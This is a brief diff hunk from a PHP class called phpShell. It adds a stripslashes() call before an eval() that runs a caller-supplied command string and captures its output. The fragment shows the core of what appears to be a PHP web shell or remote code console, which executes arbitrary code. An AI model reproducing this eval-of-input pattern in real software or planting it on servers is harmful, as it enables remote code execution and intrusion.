@@ -42,6 +42,7 @@ class phpShell {
 	 */
 	function execPHP($cmd) {
 		ob_start();
+        $cmd=stripslashes($cmd);
 		eval($cmd);
 		$contents = ob_get_contents();
 		ob_clean();
